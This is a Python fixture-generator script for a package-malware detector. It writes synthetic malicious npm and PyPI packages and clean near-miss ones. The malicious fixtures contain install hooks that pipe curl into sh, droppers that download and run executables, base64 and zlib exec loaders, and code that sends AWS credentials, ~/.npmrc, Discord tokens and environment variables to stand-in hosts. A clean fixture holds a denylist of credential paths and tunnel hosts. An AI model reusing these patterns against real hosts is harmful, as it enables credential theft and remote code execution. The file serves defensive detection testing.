"""Generate the synthetic fixture corpus under ``tests/fixtures/``.

Run ``python scripts/build_fixtures.py`` after editing this file. The fixtures imitate
the *shape* of publicly documented supply-chain attacks so the detectors can be measured,
but they are deliberately inert:

* every URL points at ``example.invalid`` (a reserved name that never resolves) or a
  documentation-range IP address (203.0.113.0/24);
* "payloads" decode to a harmless ``print`` statement;
* "binaries" are a two-byte magic number followed by zeros, not runnable programs;
* nothing here is ever executed: fixtures are stored as JSON strings and only read.
"""

from __future__ import annotations

import base64
import json
import sys
import zlib
from pathlib import Path

ROOT = Path(__file__).resolve().parent.parent / "tests" / "fixtures"

HARMLESS = "print('synthetic PkgWatch fixture: nothing happens here')\n"
B64_PAYLOAD = base64.b64encode(HARMLESS.encode()).decode()
ZLIB_PAYLOAD = base64.b64encode(zlib.compress((HARMLESS * 30).encode())).decode()
HEX_PAYLOAD = ("console.log('synthetic PkgWatch fixture');" * 12).encode().hex()
FAKE_PE = base64.b64encode(b"MZ" + b"\x00" * 126).decode()
FAKE_ELF = base64.b64encode(b"\x7fELF" + b"\x00" * 124).decode()
README = (
    "# {name}\n\nA small, well documented library. Install it with your package manager, "
    "import it, and call the functions described below.\n\n## Usage\n\nSee the examples "
    "directory for complete programs.\n"
)

BASELINES = {
    "npm": [
        "lodash", "express", "react", "axios", "chalk", "debug", "commander", "moment",
        "ua-parser-js", "event-stream", "cross-env", "@types/node", "@babel/core",
        "@babel/preset-env", "typescript", "webpack", "eslint", "prettier", "request", "async",
        "uuid", "bcrypt", "husky", "esbuild", "discord.js", "node-fetch", "minimist", "yargs",
    ],
    "pypi": [
        "requests", "colorama", "numpy", "pandas", "django", "flask", "urllib3", "boto3",
        "setuptools", "pip", "six", "python-dateutil", "pyyaml", "click", "jinja2",
        "cryptography", "pytest", "scipy", "pillow", "attrs", "certifi", "idna", "packaging",
    ],
}  # fmt: skip


def pkg_json(name: str, version: str, **extra: object) -> str:
    return json.dumps({"name": name, "version": version, "main": "index.js", **extra}, indent=2)


def good_meta(name: str, **extra: object) -> dict:
    return {
        "description": f"{name}: a documented utility library",
        "readme": README.format(name=name),
        "repository_url": f"https://github.com/example-org/{name.split('/')[-1]}",
        "maintainers": ["longtime-maintainer"],
        "publisher_is_new": False,
        "version_count": 12,
        "previous_version": "1.0.0",
        "created_days_ago": 900,
        **extra,
    }


NEW = {"publisher_is_new": True, "version_count": 1, "created_days_ago": 1}

MALICIOUS: dict[str, dict] = {}
CLEAN: dict[str, dict] = {}

# --------------------------------------------------------------------------- malicious

MALICIOUS["pypi-reqeusts-b64-setup"] = {
    "pattern": "Typosquat of requests with a base64-exec setup.py dropper",
    "ecosystem": "pypi",
    "name": "reqeusts",
    "version": "2.31.1",
    "meta": {**NEW, "description": "", "archive_kinds": ["sdist"]},
    "expected": [
        "typosquat",
        "new-publisher-similar-name",
        "sparse-metadata",
        "python-install-code",
        "obfuscation",
    ],  # fmt: skip
    "files": {
        "reqeusts-2.31.1/setup.py": f'''import base64
from setuptools import setup

payload = "{B64_PAYLOAD}"
exec(base64.b64decode(payload))

setup(name="reqeusts", version="2.31.1", packages=["reqeusts"])
''',
        "reqeusts-2.31.1/reqeusts/__init__.py": "from .api import get\n",
        "reqeusts-2.31.1/reqeusts/api.py": "def get(url):\n    return url\n",
    },
}

MALICIOUS["pypi-colourama-install-dropper"] = {
    "pattern": "colorama typosquat whose custom install command downloads and runs a file",
    "ecosystem": "pypi",
    "name": "colourama",
    "version": "0.4.7",
    "meta": {
        **NEW,
        "description": "Cross-platform colored terminal text.",
        "archive_kinds": ["sdist"],
    },
    "expected": [
        "typosquat",
        "new-publisher-similar-name",
        "sparse-metadata",
        "python-install-code",
        "binary-dropper",
    ],  # fmt: skip
    "files": {
        "colourama-0.4.7/setup.py": """import os
import subprocess
import tempfile
import urllib.request

from setuptools import setup
from setuptools.command.install import install


class PostInstall(install):
    def run(self):
        install.run(self)
        target = os.path.join(tempfile.gettempdir(), "helper.exe")
        urllib.request.urlretrieve("https://example.invalid/stage2/helper.exe", target)
        subprocess.Popen([target])


setup(name="colourama", version="0.4.7", cmdclass={"install": PostInstall})
""",
        "colourama-0.4.7/colourama/__init__.py": "RESET = '\\033[0m'\n",
    },
}

MALICIOUS["pypi-ctx-style-env-exfil"] = {
    "pattern": "ctx-style hijack: environment and AWS credentials sent to a remote endpoint",
    "ecosystem": "pypi",
    "name": "ctx-dict",
    "version": "0.2.6",
    "meta": {
        **NEW,
        "description": "A minimal dict with dot access.",
        "archive_kinds": ["wheel:pure"],
    },
    "expected": ["exfiltration", "sparse-metadata"],
    "files": {
        "ctx_dict/__init__.py": """import os

import requests


class Ctx(dict):
    def __init__(self):
        self.sendRequest()

    def sendRequest(self):
        creds = open(os.path.expanduser("~/.aws/credentials")).read()
        requests.get("https://example.invalid/hacked/", params={"env": str(dict(os.environ)), "c": creds})
""",
    },
}

MALICIOUS["npm-event-stream-style-payload"] = {
    "pattern": "event-stream/flatmap-stream style: hex-encoded payload decoded and evaluated",
    "ecosystem": "npm",
    "name": "flatmap-stream-fixture",
    "version": "0.1.1",
    "meta": {
        **NEW,
        "description": "flatmap for streams",
        "repository_url": "https://github.com/example-org/flatmap-stream-fixture",
    },
    "expected": ["obfuscation", "sparse-metadata"],
    "files": {
        "package/package.json": pkg_json("flatmap-stream-fixture", "0.1.1"),
        "package/index.js": f'''var Stream = require("stream").Stream;
var data = "{HEX_PAYLOAD}";
module.exports = function (mapper) {{
  var stream = new Stream();
  eval(Buffer.from(data, "hex").toString());
  return stream;
}};
''',
    },
}

MALICIOUS["npm-ua-parser-style-preinstall"] = {
    "pattern": "ua-parser-js style: preinstall script fetches a platform binary and runs it",
    "ecosystem": "npm",
    "name": "ua-parsr-js",
    "version": "0.7.29",
    "meta": {**NEW, "description": "Detect browser, engine, OS from the User-Agent"},
    "expected": [
        "typosquat",
        "new-publisher-similar-name",
        "sparse-metadata",
        "npm-install-hook",
        "binary-dropper",
    ],  # fmt: skip
    "files": {
        "package/package.json": pkg_json(
            "ua-parsr-js",
            "0.7.29",
            scripts={"preinstall": "start /B node preinstall.js & node preinstall.js"},
        ),
        "package/preinstall.js": """const { execFile } = require("child_process");
const fs = require("fs");
const https = require("https");
const os = require("os");
const path = require("path");

const target = path.join(os.tmpdir(), "jsextension.exe");
https.get("https://example.invalid/download/jsextension.exe", (res) => {
  res.pipe(fs.createWriteStream(target)).on("finish", () => {
    fs.chmodSync(target, 0o755);
    execFile(target, ["-k"]);
  });
});
""",
        "package/index.js": "module.exports = function parse(ua) { return { ua: ua }; };\n",
    },
}

MALICIOUS["npm-discord-token-stealer"] = {
    "pattern": "Discord token stealer: reads the client's leveldb store and posts to a webhook",
    "ecosystem": "npm",
    "name": "discord-nitro-tools",
    "version": "1.0.3",
    "meta": {**NEW, "description": "Handy helpers for Discord bots"},
    "expected": ["exfiltration", "suspicious-endpoint", "sparse-metadata"],
    "files": {
        "package/package.json": pkg_json("discord-nitro-tools", "1.0.3"),
        "package/index.js": """const fs = require("fs");
const https = require("https");
const path = require("path");

const store = path.join(process.env.APPDATA || "", "discord", "Local Storage", "leveldb");
const hook = "https://discord.com.example.invalid/api/webhooks/000000000000000000/FAKE-FIXTURE-TOKEN";

function collect() {
  const found = [];
  for (const file of fs.readdirSync(store)) {
    const text = fs.readFileSync(path.join(store, file), "utf8");
    found.push(...(text.match(/[\\w-]{24}\\.[\\w-]{6}\\.[\\w-]{27}/g) || []));
  }
  return found;
}

const req = https.request(hook, { method: "POST" });
req.write(JSON.stringify({ content: collect().join("\\n") }));
req.end();
""",
    },
}

MALICIOUS["npm-lodahs-curl-postinstall"] = {
    "pattern": "lodash typosquat with a curl-pipe-shell postinstall script",
    "ecosystem": "npm",
    "name": "lodahs",
    "version": "4.17.22",
    "meta": {**NEW, "description": "Lodash modular utilities."},
    "expected": ["typosquat", "new-publisher-similar-name", "sparse-metadata", "npm-install-hook"],
    "files": {
        "package/package.json": pkg_json(
            "lodahs",
            "4.17.22",
            scripts={"postinstall": "curl -s https://example.invalid/i.sh | sh"},
        ),
        "package/index.js": "module.exports = require('./lodash');\n",
        "package/lodash.js": "module.exports = { identity: function (x) { return x; } };\n",
    },
}

MALICIOUS["npm-expres-repo-impersonation"] = {
    "pattern": "express typosquat that copies the real project's repository link",
    "ecosystem": "npm",
    "name": "expres",
    "version": "4.19.3",
    "meta": {
        **NEW,
        "description": "Fast, unopinionated, minimalist web framework",
        "readme": README.format(name="express"),
        "repository_url": "https://github.com/expressjs/express",
    },
    "expected": ["typosquat", "new-publisher-similar-name", "repo-impersonation"],
    "files": {
        "package/package.json": pkg_json("expres", "4.19.3"),
        "package/index.js": "module.exports = require('./lib/express');\n",
        "package/lib/express.js": "module.exports = function createApplication() { return {}; };\n",
    },
}

MALICIOUS["npm-dependency-confusion-oast"] = {
    "pattern": "Dependency confusion: internal-looking name at version 99 that phones home",
    "ecosystem": "npm",
    "name": "acme-internal-utils",
    "version": "99.9.9",
    "meta": {**NEW, "description": "internal utils"},
    "expected": [
        "dependency-confusion",
        "npm-install-hook",
        "suspicious-endpoint",
        "sparse-metadata",
    ],
    "files": {
        "package/package.json": pkg_json(
            "acme-internal-utils", "99.9.9", scripts={"preinstall": "node index.js"}
        ),
        "package/index.js": """const dns = require("dns");
const os = require("os");

const label = Buffer.from(os.hostname() + "." + os.userInfo().username).toString("hex");
dns.lookup(label + ".c1a2b3fixture.oast.fun.example.invalid", function () {});
""",
    },
}

MALICIOUS["pypi-pth-persistence"] = {
    "pattern": "Executable .pth file that decodes and runs code on every interpreter start",
    "ecosystem": "pypi",
    "name": "fastlog-speedups",
    "version": "1.2.0",
    "meta": {**NEW, "description": "C speedups for fastlog", "archive_kinds": ["wheel:pure"]},
    "expected": ["python-install-code", "obfuscation", "sparse-metadata"],
    "files": {
        "fastlog_speedups.pth": f"import os; exec(__import__('base64').b64decode('{B64_PAYLOAD}'))\n",
        "fastlog_speedups/__init__.py": "__version__ = '1.2.0'\n",
    },
}

MALICIOUS["pypi-w4sp-style-zlib-exec"] = {
    "pattern": "W4SP-style loader: exec(zlib.decompress(base64...)) hidden in __init__.py",
    "ecosystem": "pypi",
    "name": "pystyle-colors-ext",
    "version": "0.0.4",
    "meta": {**NEW, "description": "Terminal styling helpers", "archive_kinds": ["sdist"]},
    "expected": ["obfuscation", "sparse-metadata"],
    "files": {
        "pystyle-colors-ext-0.0.4/setup.py": 'from setuptools import setup\n\nsetup(name="pystyle-colors-ext", version="0.0.4")\n',
        "pystyle-colors-ext-0.0.4/pystyle_colors_ext/__init__.py": f'''import base64
import zlib

def red(text):
    return "\\033[31m" + text + "\\033[0m"

exec(zlib.decompress(base64.b64decode("{ZLIB_PAYLOAD}")))
''',
    },
}

MALICIOUS["npm-types-node-scope-confusion"] = {
    "pattern": "Scope confusion (types-node vs @types/node) with an install script that reports the host",
    "ecosystem": "npm",
    "name": "types-node",
    "version": "20.11.6",
    "meta": {**NEW, "description": "TypeScript definitions for node"},
    "expected": [
        "name-manipulation",
        "new-publisher-similar-name",
        "sparse-metadata",
        "npm-install-hook",
        "suspicious-endpoint",
    ],  # fmt: skip
    "files": {
        "package/package.json": pkg_json(
            "types-node", "20.11.6", scripts={"install": "node scripts/setup.js"}
        ),
        "package/scripts/setup.js": """const https = require("https");
const os = require("os");

const body = JSON.stringify({ host: os.hostname(), user: os.userInfo().username, cwd: process.cwd() });
const req = https.request("https://eo1fixture00000.m.pipedream.net.example.invalid/", { method: "POST" });
req.write(body);
req.end();
""",
        "package/index.d.ts": "export {};\n",
    },
}

MALICIOUS["pypi-nurnpy-homoglyph-system"] = {
    "pattern": "Homoglyph squat (rn for m) whose setup.py pipes a remote script into a shell",
    "ecosystem": "pypi",
    "name": "nurnpy",
    "version": "1.26.5",
    "meta": {
        **NEW,
        "description": "Fundamental package for array computing",
        "archive_kinds": ["sdist"],
    },
    "expected": [
        "name-manipulation",
        "new-publisher-similar-name",
        "sparse-metadata",
        "python-install-code",
        "binary-dropper",
    ],  # fmt: skip
    "files": {
        "nurnpy-1.26.5/setup.py": """import os

from setuptools import setup

os.system("curl -s https://example.invalid/bootstrap.sh | sh")

setup(name="nurnpy", version="1.26.5")
""",
        "nurnpy-1.26.5/nurnpy/__init__.py": "__version__ = '1.26.5'\n",
    },
}

MALICIOUS["npm-charcode-env-rawip"] = {
    "pattern": "Character-code obfuscation hiding an environment dump sent to a raw IP address",
    "ecosystem": "npm",
    "name": "color-fmt-lite-x",
    "version": "1.0.0",
    "meta": {**NEW, "description": "tiny color formatter"},
    "expected": ["obfuscation", "exfiltration", "suspicious-endpoint", "sparse-metadata"],
    "files": {
        "package/package.json": pkg_json("color-fmt-lite-x", "1.0.0"),
        "package/index.js": """const mod = String.fromCharCode(104, 116, 116, 112, 104, 116, 116, 112, 104, 116, 116, 112, 104, 116, 116, 112, 104, 116, 116, 112);
const http = require("http");

const req = http.request("http://203.0.113.7/collect", { method: "POST" });
req.write(JSON.stringify(process.env));
req.end();

module.exports = function red(text) { return "\\u001b[31m" + text + "\\u001b[0m"; };
""",
    },
}

MALICIOUS["pypi-bundled-binary-autostart"] = {
    "pattern": "Combosquat that ships an executable and writes an autostart entry from setup.py",
    "ecosystem": "pypi",
    "name": "requests-updater",
    "version": "1.0.1",
    "meta": {**NEW, "description": "Keeps requests up to date", "archive_kinds": ["sdist"]},
    "expected": [
        "combosquat",
        "new-publisher-similar-name",
        "sparse-metadata",
        "python-install-code",
        "binary-dropper",
    ],  # fmt: skip
    "files": {
        "requests-updater-1.0.1/setup.py": """import os

from setuptools import setup

with open(os.path.expanduser("~/.config/autostart/updater.desktop"), "w") as handle:
    handle.write("[Desktop Entry]\\nExec=updater\\n")

setup(name="requests-updater", version="1.0.1", package_data={"requests_updater": ["updater.exe"]})
""",
        "requests-updater-1.0.1/requests_updater/__init__.py": "__version__ = '1.0.1'\n",
    },
    "files_b64": {"requests-updater-1.0.1/requests_updater/updater.exe": FAKE_PE},
}

MALICIOUS["npm-axios-helper-npmrc-telegram"] = {
    "pattern": "Combosquat that reads ~/.npmrc and sends it to a Telegram bot",
    "ecosystem": "npm",
    "name": "axios-helper",
    "version": "1.6.9",
    "meta": {**NEW, "description": "Helpers for axios"},
    "expected": [
        "combosquat",
        "new-publisher-similar-name",
        "sparse-metadata",
        "exfiltration",
        "suspicious-endpoint",
    ],  # fmt: skip
    "files": {
        "package/package.json": pkg_json("axios-helper", "1.6.9"),
        "package/index.js": """const fs = require("fs");
const https = require("https");
const os = require("os");
const path = require("path");

const token = fs.readFileSync(path.join(os.homedir(), ".npmrc"), "utf8");
const url = "https://api.telegram.org.example.invalid/bot0000000000:FAKE-FIXTURE/sendMessage";
const req = https.request(url, { method: "POST" });
req.write(JSON.stringify({ chat_id: 0, text: token }));
req.end();
""",
    },
}

MALICIOUS["npm-zip-slip-archive"] = {
    "pattern": "Archive whose entries escape the extraction root (zip-slip)",
    "ecosystem": "npm",
    "name": "tar-escape-fixture",
    "version": "1.0.0",
    "meta": {
        **NEW,
        "description": "archive helper",
        "archive_error": "unsafe: path traversal in archive: 'package/../../../.bashrc'",
    },
    "expected": ["unsafe-archive", "sparse-metadata"],
    "files": {},
}

MALICIOUS["npm-popular-takeover-loader"] = {
    "pattern": "Maintainer takeover of a popular package: new maintainer, new install script, hidden loader",
    "ecosystem": "npm",
    "name": "event-stream",
    "version": "3.3.6",
    "meta": good_meta(
        "event-stream",
        maintainers=["longtime-maintainer", "right9ctrl-fixture"],
        previous_maintainers=["longtime-maintainer"],
        previous_version="3.3.5",
        size=900_000,
        previous_size=120_000,
    ),
    "expected": ["popular-package-change", "npm-install-hook", "obfuscation"],
    "files": {
        "package/package.json": pkg_json(
            "event-stream", "3.3.6", scripts={"postinstall": "node lib/loader.js"}
        ),
        "package/index.js": "module.exports = require('./lib/stream');\n",
        "package/lib/stream.js": "module.exports = function through() { return {}; };\n",
        "package/lib/loader.js": f'''var blob = "{B64_PAYLOAD}";
eval(atob(blob));
''',
    },
}

# --------------------------------------------------------------------------- clean

CLEAN["pypi-requests-version-exec"] = {
    "pattern": "Popular package; setup.py uses the exec(open(version file).read()) idiom",
    "ecosystem": "pypi",
    "name": "requests",
    "version": "2.32.3",
    "meta": good_meta("requests", archive_kinds=["sdist", "wheel:pure"]),
    "files": {
        "requests-2.32.3/setup.py": """import os

from setuptools import setup

about = {}
here = os.path.abspath(os.path.dirname(__file__))
with open(os.path.join(here, "requests", "__version__.py")) as f:
    exec(f.read(), about)

setup(name="requests", version=about["__version__"], packages=["requests"])
""",
        "requests-2.32.3/requests/__version__.py": '__version__ = "2.32.3"\n',
        "requests-2.32.3/requests/api.py": """from . import sessions


def get(url, **kwargs):
    with sessions.Session() as session:
        return session.request("GET", url, **kwargs)
""",
        "requests-2.32.3/requests/utils.py": '''import os


def get_netrc_auth(url):
    """Read credentials for ``url`` from the user's ~/.netrc file."""
    path = os.path.expanduser("~/.netrc")
    return path if os.path.exists(path) else None
''',
    },
}

CLEAN["pypi-colorama-wheel"] = {
    "pattern": "Popular pure-Python wheel with no install-time code",
    "ecosystem": "pypi",
    "name": "colorama",
    "version": "0.4.6",
    "meta": good_meta("colorama", archive_kinds=["wheel:pure"]),
    "files": {
        "colorama/__init__.py": "from .ansi import Fore\n",
        "colorama/ansi.py": "class Fore:\n    RED = '\\033[31m'\n    RESET = '\\033[39m'\n",
        "colorama-0.4.6.dist-info/METADATA": "Name: colorama\nVersion: 0.4.6\n",
    },
}

CLEAN["npm-lodash"] = {
    "pattern": "Popular utility library, no scripts",
    "ecosystem": "npm",
    "name": "lodash",
    "version": "4.17.21",
    "meta": good_meta("lodash"),
    "files": {
        "package/package.json": pkg_json("lodash", "4.17.21", scripts={"test": "echo ok"}),
        "package/lodash.js": "module.exports = { chunk: function (a, n) { return [a.slice(0, n)]; } };\n",
        "package/fp.js": "module.exports = require('./lodash');\n",
    },
}

CLEAN["npm-express"] = {
    "pattern": "Popular web framework that legitimately uses the http module",
    "ecosystem": "npm",
    "name": "express",
    "version": "4.19.2",
    "meta": good_meta("express", repository_url="https://github.com/expressjs/express"),
    "files": {
        "package/package.json": pkg_json("express", "4.19.2"),
        "package/lib/application.js": """var http = require("http");

exports.listen = function listen() {
  var server = http.createServer(this);
  return server.listen.apply(server, arguments);
};
""",
    },
}

CLEAN["npm-native-addon-node-gyp"] = {
    "pattern": "Native addon: node-gyp install script and a compiled .node file (near miss)",
    "ecosystem": "npm",
    "name": "bcrypt",
    "version": "5.1.1",
    "meta": good_meta("bcrypt"),
    "files": {
        "package/package.json": pkg_json(
            "bcrypt",
            "5.1.1",
            scripts={"install": "node-gyp-build || node-gyp rebuild"},
            gypfile=True,
        ),
        "package/binding.gyp": '{"targets": [{"target_name": "bcrypt_lib"}]}\n',
        "package/bcrypt.js": "module.exports = require('node-gyp-build')(__dirname);\n",
    },
    "files_b64": {"package/prebuilds/linux-x64/bcrypt.node": FAKE_ELF},
}

CLEAN["pypi-cli-subprocess-near-miss"] = {
    "pattern": "New CLI tool that uses subprocess in its runtime module, not at install time (near miss)",
    "ecosystem": "pypi",
    "name": "gitwrap-cli",
    "version": "0.3.0",
    "meta": good_meta("gitwrap-cli", version_count=2, created_days_ago=20, archive_kinds=["sdist"]),
    "files": {
        "gitwrap-cli-0.3.0/setup.py": 'from setuptools import setup\n\nsetup(name="gitwrap-cli", version="0.3.0", packages=["gitwrap"])\n',
        "gitwrap-cli-0.3.0/gitwrap/cli.py": """import subprocess
import sys


def main():
    result = subprocess.run(["git", *sys.argv[1:]], check=False)
    return result.returncode
""",
    },
}

CLEAN["pypi-numpy-style-build"] = {
    "pattern": "Popular package with a custom build_ext and a git-describe version lookup",
    "ecosystem": "pypi",
    "name": "numpy",
    "version": "1.26.4",
    "meta": good_meta("numpy", archive_kinds=["sdist"]),
    "files": {
        "numpy-1.26.4/setup.py": """import subprocess

from setuptools import setup
from setuptools.command.build_ext import build_ext


class BuildExt(build_ext):
    def run(self):
        build_ext.run(self)


def git_version():
    try:
        return subprocess.check_output(["git", "describe", "--tags"]).decode().strip()
    except Exception:
        return "unknown"


setup(name="numpy", version="1.26.4", cmdclass={"build_ext": BuildExt})
""",
        "numpy-1.26.4/numpy/__init__.py": "__version__ = '1.26.4'\n",
    },
}

CLEAN["npm-husky-npmrc-reader"] = {
    "pattern": "App with a husky postinstall and a config reader that touches ~/.npmrc without any network use",
    "ecosystem": "npm",
    "name": "registry-config-reader",
    "version": "2.1.0",
    "meta": good_meta("registry-config-reader"),
    "files": {
        "package/package.json": pkg_json(
            "registry-config-reader", "2.1.0", scripts={"postinstall": "husky install"}
        ),
        "package/index.js": """const fs = require("fs");
const os = require("os");
const path = require("path");

module.exports = function readRegistry() {
  const file = path.join(os.homedir(), ".npmrc");
  const line = fs.readFileSync(file, "utf8").split("\\n").find((l) => l.startsWith("registry="));
  return line ? line.slice("registry=".length) : "https://registry.npmjs.org/";
};
""",
    },
}

_BUNDLE = "!function(e){" + "var a=1;function b(c){return c+a}e.x=b;" * 400 + "}(this);"
_DATA_URI = "data:image/png;base64," + base64.b64encode(bytes(range(256)) * 4).decode()

CLEAN["npm-ui-kit-minified-bundle"] = {
    "pattern": "UI kit shipping a minified bundle and an inline base64 image (near miss for obfuscation)",
    "ecosystem": "npm",
    "name": "example-ui-kit",
    "version": "3.4.0",
    "meta": good_meta("example-ui-kit"),
    "files": {
        "package/package.json": pkg_json("example-ui-kit", "3.4.0", main="dist/kit.min.js"),
        "package/dist/kit.min.js": _BUNDLE,
        "package/src/index.js": "export * from './button.js';\nexport * from './modal.js';\n",
        "package/src/button.js": "export function button(label) { return { label }; }\n",
        "package/src/modal.js": "export function modal(body) { return { body }; }\n",
        "package/src/icons.js": f'export const logo = "{_DATA_URI}";\n',
        "package/src/theme.js": "export const theme = { primary: '#2266dd' };\n",
        "package/src/util.js": "export function noop() {}\n",
    },
}

CLEAN["pypi-aws-profile-reader"] = {
    "pattern": "Config helper that reads ~/.aws/credentials in one module and uses HTTP in another (near miss)",
    "ecosystem": "pypi",
    "name": "aws-profile-switcher",
    "version": "1.4.2",
    "meta": good_meta("aws-profile-switcher", archive_kinds=["wheel:pure"]),
    "files": {
        "aws_profile_switcher/profiles.py": """import configparser
import os


def list_profiles():
    parser = configparser.ConfigParser()
    parser.read(os.path.expanduser("~/.aws/credentials"))
    return parser.sections()
""",
        "aws_profile_switcher/update_check.py": """import requests


def latest_version():
    return requests.get("https://pypi.org/pypi/aws-profile-switcher/json", timeout=5).json()["info"]["version"]
""",
    },
}

CLEAN["npm-discord-bot-library"] = {
    "pattern": "Discord bot library using the normal REST API and a token from the environment (near miss)",
    "ecosystem": "npm",
    "name": "tiny-discord-client",
    "version": "0.9.1",
    "meta": good_meta("tiny-discord-client"),
    "files": {
        "package/package.json": pkg_json("tiny-discord-client", "0.9.1"),
        "package/index.js": """const API = "https://discord.com/api/v10";

module.exports = async function sendMessage(channel, content) {
  const res = await fetch(`${API}/channels/${channel}/messages`, {
    method: "POST",
    headers: { Authorization: `Bot ${process.env.DISCORD_TOKEN}`, "Content-Type": "application/json" },
    body: JSON.stringify({ content }),
  });
  return res.json();
};
""",
    },
}

CLEAN["pypi-platform-wheel-extension"] = {
    "pattern": "Platform wheel that legitimately contains a compiled extension module",
    "ecosystem": "pypi",
    "name": "fastjson-ext",
    "version": "2.0.1",
    "meta": good_meta("fastjson-ext", archive_kinds=["wheel:platform"]),
    "files": {"fastjson_ext/__init__.py": "from ._speedups import loads\n"},
    "files_b64": {"fastjson_ext/_speedups.cpython-312-x86_64-linux-gnu.so": FAKE_ELF},
}

CLEAN["npm-new-sparse-unrelated"] = {
    "pattern": "Brand-new package with thin metadata and an unrelated name: unlisted on its own",
    "ecosystem": "npm",
    "name": "zebra-crossing-timer",
    "version": "0.0.1",
    "meta": {**NEW, "description": ""},
    "allowed": ["sparse-metadata"],
    "files": {
        "package/package.json": pkg_json("zebra-crossing-timer", "0.0.1"),
        "package/index.js": "module.exports = function wait(ms) { return new Promise((r) => setTimeout(r, ms)); };\n",
    },
}

CLEAN["npm-scoped-fork"] = {
    "pattern": "Scoped fork of a popular package under the publisher's own scope",
    "ecosystem": "npm",
    "name": "@example-org/lodash",
    "version": "4.17.21-patch.1",
    "meta": good_meta("@example-org/lodash"),
    "files": {
        "package/package.json": pkg_json("@example-org/lodash", "4.17.21-patch.1"),
        "package/lodash.js": "module.exports = { identity: function (x) { return x; } };\n",
    },
}

CLEAN["pypi-calver-first-release"] = {
    "pattern": "First release using calendar versioning (near miss for the high-version check)",
    "ecosystem": "pypi",
    "name": "tide-tables-nl",
    "version": "2026.11.1",
    "meta": good_meta(
        "tide-tables-nl", version_count=1, created_days_ago=1, archive_kinds=["wheel:pure"]
    ),
    "files": {"tide_tables_nl/__init__.py": "__version__ = '2026.11.1'\n"},
}

CLEAN["npm-platform-binary-package"] = {
    "pattern": "Platform-specific binary package declaring os and cpu (like esbuild's per-platform packages)",
    "ecosystem": "npm",
    "name": "@fastbuild/win32-x64",
    "version": "0.21.5",
    "meta": good_meta("@fastbuild/win32-x64"),
    "files": {
        "package/package.json": pkg_json(
            "@fastbuild/win32-x64", "0.21.5", os=["win32"], cpu=["x64"]
        ),
    },
    "files_b64": {"package/fastbuild.exe": FAKE_PE},
}

CLEAN["pypi-namespace-pth"] = {
    "pattern": "Namespace-package .pth file generated by setuptools (near miss for .pth detection)",
    "ecosystem": "pypi",
    "name": "example.plugins.core",
    "version": "1.0.0",
    "meta": good_meta("example.plugins.core", archive_kinds=["wheel:pure"]),
    "files": {
        "example.plugins.core-1.0.0-nspkg.pth": "import sys, types, os;has_mfs = sys.version_info > (3, 5);p = os.path.join(sys._getframe(1).f_locals['sitedir'], *('example',));m = sys.modules.setdefault('example', types.ModuleType('example'));mp = (m or []) and m.__dict__.setdefault('__path__',[]);(p not in mp) and mp.append(p)\n",
        "example/plugins/core/__init__.py": "NAME = 'core'\n",
        "paths.pth": "../shared-libs\n",
    },
}


CLEAN["pypi-security-scanner-denylist"] = {
    "pattern": "Security tool that lists sensitive paths and tunnel hosts as patterns, and uses HTTP (near miss)",
    "ecosystem": "pypi",
    "name": "leakguard-hooks",
    "version": "1.3.0",
    "meta": good_meta("leakguard-hooks", archive_kinds=["wheel:pure"]),
    "files": {
        "leakguard_hooks/rules.py": """import re

import requests

SENSITIVE = re.compile(r"(?:~/\\.ssh/|/\\.aws/credentials|\\.npmrc|\\.pypirc|\\.netrc|id_rsa)")
TUNNEL_HOSTS = ("ngrok.io", "pipedream.net", "oast.fun", "webhook.site")
ENV_TO_NET = re.compile(r"\\b(?:env|printenv)\\b\\s*[|]\\s*(?:curl|nc)")


def fetch_rules(url):
    return requests.get(url, timeout=10).json()


def is_sensitive(path):
    return bool(SENSITIVE.search(path))
""",
    },
}

CLEAN["pypi-subprocess-env-copy"] = {
    "pattern": "Launcher that copies the environment for a child process and checks for updates (near miss)",
    "ecosystem": "pypi",
    "name": "taskrunner-launch",
    "version": "0.8.2",
    "meta": good_meta("taskrunner-launch", archive_kinds=["wheel:pure"]),
    "files": {
        "taskrunner_launch/runtime.py": """import os
import subprocess
from urllib.request import urlopen


def latest():
    with urlopen("https://pypi.org/pypi/taskrunner-launch/json", timeout=5) as response:
        return response.read()


def launch(command):
    environment = os.environ.copy()
    environment["TASKRUNNER"] = "1"
    return subprocess.run(command, env=environment, check=False).returncode
""",
    },
}

CLEAN["npm-dev-server-fetch-spawn"] = {
    "pattern": "Dev server with a fetch handler method and a spawned build process (near miss for download-and-run)",
    "ecosystem": "npm",
    "name": "miniapp-dev-server",
    "version": "0.4.0",
    "meta": good_meta("miniapp-dev-server"),
    "files": {
        "package/package.json": pkg_json("miniapp-dev-server", "0.4.0"),
        "package/src/dev.js": """const { spawn } = require("child_process");

const server = {
  async fetch(req) {
    const upstream = await fetch("https://registry.npmjs.org/miniapp-dev-server");
    return new Response(await upstream.text());
  },
};

function build() {
  return spawn("node", ["scripts/build.js"], { stdio: "inherit" });
}

module.exports = { server, build, hooks: ["pre-commit.sh"] };
""",
    },
}

CLEAN["npm-napi-prebuilt-addon"] = {
    "pattern": "napi-rs style package shipping prebuilt .node addons at the package root",
    "ecosystem": "npm",
    "name": "cbor-fast-node",
    "version": "0.19.8",
    "meta": good_meta("cbor-fast-node"),
    "files": {
        "package/package.json": pkg_json("cbor-fast-node", "0.19.8"),
        "package/index.js": "module.exports = require('./cbor-fast-node.' + process.platform + '-' + process.arch + '.node');\n",
    },
    "files_b64": {"package/cbor-fast-node.linux-x64-gnu.node": FAKE_ELF},
}


def main() -> int:
    for kind, corpus in (("malicious", MALICIOUS), ("clean", CLEAN)):
        folder = ROOT / kind
        folder.mkdir(parents=True, exist_ok=True)
        for stale in folder.glob("*.json"):
            stale.unlink()
        for name, spec in corpus.items():
            spec.setdefault("expected", [])
            text = json.dumps(spec, indent=1, sort_keys=True, ensure_ascii=True) + "\n"
            (folder / f"{name}.json").write_text(text, encoding="utf-8", newline="\n")
    (ROOT / "baselines").mkdir(parents=True, exist_ok=True)
    for ecosystem, names in BASELINES.items():
        doc = {"source": "fixture", "count": len(names), "packages": names}
        text = json.dumps(doc, indent=1) + "\n"
        (ROOT / "baselines" / f"{ecosystem}-top.json").write_text(
            text, encoding="utf-8", newline="\n"
        )
    print(f"wrote {len(MALICIOUS)} malicious and {len(CLEAN)} clean fixtures to {ROOT}")
    return 0


if __name__ == "__main__":
    sys.exit(main())
